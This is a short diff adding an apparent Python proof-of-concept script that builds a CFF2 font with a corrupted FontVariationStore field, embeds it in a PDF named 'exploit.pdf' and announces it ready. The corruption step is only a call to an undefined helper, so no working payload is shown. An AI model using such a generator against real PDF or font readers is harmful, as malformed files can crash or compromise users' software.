@@ -1,0 +1,8 @@
+from pdflib import PDFWriter
+
+# Generar un objeto FontVariationStore con campo corrupto
+bad_font = create_cff2_font(corrupt=True)
+pdf = PDFWriter()
+pdf.embed_font(bad_font)
+pdf.save("exploit.pdf")
+print("Exploit PDF ready")
